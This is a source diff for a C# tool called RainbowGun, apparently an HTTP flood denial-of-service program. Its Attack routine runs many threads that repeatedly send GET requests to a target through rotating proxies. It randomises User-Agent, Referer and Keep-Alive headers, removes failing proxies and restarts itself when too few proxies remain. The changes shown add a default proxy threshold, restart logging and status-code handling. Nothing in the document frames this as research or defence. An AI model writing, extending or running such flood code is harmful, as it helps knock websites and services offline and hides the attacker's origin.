@@ -18,7 +18,7 @@ namespace RainbowGun
         private string proxies_type = "http";
         private int proxies_wait_delay = 15000;
         private List<string> proxies;
-        private int critical_proxies_count;
+        private int critical_proxies_count = 10;
 
         private int delay;
         private bool random_string;
@@ -45,7 +45,7 @@ namespace RainbowGun
             }
             SetUserAgentList();
             SetRefererList();
-            
+
         }
 
         public void Attack()
@@ -54,22 +54,30 @@ namespace RainbowGun
             if (proxies.Count != 0)
             {
                 Console.ForegroundColor = ConsoleColor.Yellow;
-                Console.WriteLine("\nLoaded {0} proxies!\n",proxies.Count);
+                Console.WriteLine("\nLoaded {0} proxies!\n", proxies.Count);
                 Console.ResetColor();
                 mt = new MultiThreading((threads == -1) ? proxies.Count : threads);
                 mt.Run(AttackThread);
-                
+
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine("All {0} threads started!", mt.ThreadCount);
                 Console.ResetColor();
 
                 while (mt.Working)
                 {
-                    if (proxies.Count < critical_proxies_count)
+                    if (proxies.Count <= critical_proxies_count)
                     {
-                        Stop();
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.WriteLine("CRITICAL PROXY COUNT! RESTART INITIALIZED!");
+                        Console.ResetColor();
+                        Stop();  
+                        break;
                     }
                 }
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine("ALL THREADS STOPPED!");
+                Console.ResetColor();
+                Console.ReadKey();
                 Attack();
             }
             else
@@ -87,7 +95,7 @@ namespace RainbowGun
         {
             string attack_target = null;
             string proxy = null;
-            while (!mt.Canceling)
+            while (mt.Canceling != true)
             {
                 if (proxies.Count > 0)
                 {
@@ -97,7 +105,7 @@ namespace RainbowGun
 
                         if (proxy != null)
                         {
-                            using (HttpRequest request = new HttpRequest())
+                            using (var request = new HttpRequest())
                             {
                                 switch (proxies_type)
                                 {
@@ -135,7 +143,7 @@ namespace RainbowGun
                                 request.AddHeader("Keep-Alive", Rand.Next(110, 120).ToString());
                                 request.KeepAlive = true;
 
-                                Console.WriteLine("{0} - [{1}]", proxy, (int) request.Get(attack_target).StatusCode);
+                                Console.WriteLine("{0} - [{1}]", proxy, (int)request.Get(attack_target).StatusCode);
 
                             }
                         }
@@ -148,28 +156,41 @@ namespace RainbowGun
                         if (delete_bad && proxy != null)
                         {
                             proxies.Remove(proxy);
+                            Console.ForegroundColor = ConsoleColor.Yellow;
                             Console.WriteLine("Deleted proxy {0}", proxy);
+                            Console.WriteLine("Proxies left: {0}",proxies.Count);
+                            Console.ResetColor();
                         }
                         return;
                     }
                     catch (HttpException hex)
                     {
-                        if ((int) hex.HttpStatusCode == 500)
+                        switch ((int)hex.HttpStatusCode)
                         {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("{0} - [{1}]", proxy, (int) hex.HttpStatusCode);
-                            Console.ResetColor();
-                        }
-                        else
-                        {
-                            Console.WriteLine("{0} - [{1}]", proxy, (int)hex.HttpStatusCode);
+                            case 500:
+                                Console.ForegroundColor = ConsoleColor.Red;
+                                Console.WriteLine("{0} - [{1}]", proxy, (int)hex.HttpStatusCode);
+                                Console.ResetColor();
+                                break;
+                            case 0:
+                                if (delete_bad && proxy != null)
+                                {
+                                    proxies.Remove(proxy);
+                                    Console.ForegroundColor = ConsoleColor.Yellow;
+                                    Console.WriteLine("Deleted proxy {0}", proxy);
+                                    Console.WriteLine("Proxies left: {0}", proxies.Count);
+                                    Console.ResetColor();
+                                }
+                                return;
+                            default:
+                                Console.WriteLine("{0} - [{1}]", proxy, (int)hex.HttpStatusCode);
+                                break;
                         }
                     }
                     catch (Exception ex)
                     {
                         Console.WriteLine(ex.Message);
                     }
-
                 }
                 else
                 {
@@ -180,11 +201,11 @@ namespace RainbowGun
 
         private void GetProxies()
         {
-            Proxy proxy = new Proxy(proxies_file,proxies_type,debug,proxies_wait_delay);
+            Proxy proxy = new Proxy(proxies_file, proxies_type, debug, proxies_wait_delay);
             proxies = proxy.GetGoodProxies();
         }
 
-#region SetParametres
+        #region SetParametres
 
         public void SetProxiesTimeout(int pdelay)
         {
@@ -201,7 +222,7 @@ namespace RainbowGun
             critical_proxies_count = count < 0 ? 0 : count;
         }
 
-#endregion
+        #endregion
 
         private string GetRandomString(int size)
         {
@@ -210,15 +231,15 @@ namespace RainbowGun
             char ch;
             for (int i = 0; i < size; i++)
             {
-                if (random.Next()%2 == 0)
+                if (random.Next() % 2 == 0)
                 {
-                    ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26*random.NextDouble() + 65)));
+                    ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                     builder.Append(ch);
                 }
                 else
                 {
                     builder.Append(random.Next(0, 9));
-                } 
+                }
             }
             return builder.ToString().ToLower();
         }
